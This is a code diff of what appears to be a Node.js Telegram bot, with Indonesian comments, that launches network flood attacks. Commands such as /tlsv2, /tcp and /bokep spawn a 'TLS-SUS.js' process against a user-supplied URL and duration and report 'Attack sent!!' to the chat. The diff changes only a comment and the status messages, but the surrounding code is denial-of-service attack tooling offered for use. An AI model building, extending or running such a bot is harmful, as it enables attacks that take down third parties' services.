@@ -35,7 +35,7 @@ bot.onText(/\/ongoing/, (msg) => {
   bot.sendMessage(chatId, message);
 });
 
-// methods tlsv2
+// methods tlsvCiko
 bot.onText(/\/TlsCiko (.+)/, (msg, match) => {
   const chatId = msg.chat.id;
   const username = msg.chat.username;
@@ -52,7 +52,7 @@ const browserProcess = spawn('node', ['TLS-SUS.js', url, req, timeArg, 15,], { c
 // Tangani output dari child process
   browserProcess.stdout.on('data', (data) => {
     console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
-    bot.sendMessage(chatId, `📍The attack begins${data}`);
+    bot.sendMessage(chatId, `🟢Attack sent!!🟢${data}`);
   });
 
 // Tangani error dari child process
@@ -86,7 +86,7 @@ bot.onText(/\/tlsv2 (.+)/, (msg, match) => {
 // Tangani output dari child process
   browserProcess.stdout.on('data', (data) => {
     console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
-    bot.sendMessage(chatId, `📍The attack begins${data}`);
+    bot.sendMessage(chatId, `🟢Attack sent!!🟢${data}`);
   });
 
 // Tangani error dari child process
@@ -119,7 +119,7 @@ bot.onText(/\/tcp (.+)/, (msg, match) => {
 // Tangani output dari child process
   browserProcess.stdout.on('data', (data) => {
     console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
-    bot.sendMessage(chatId, `📍The attack begins${data}`);
+    bot.sendMessage(chatId, `🟢Attack sent!!🟢${data}`);
   });
 
 // Tangani error dari child process
@@ -153,7 +153,7 @@ bot.onText(/\/bokep (.+)/, (msg, match) => {
   // Tangani output dari child process
   browserProcess.stdout.on('data', (data) => {
     console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
-    bot.sendMessage(chatId, `📍The attack begins${data}`);
+    bot.sendMessage(chatId, `🟢Attack sent!!🟢${data}`);
   });
 
   // Tangani error dari child process
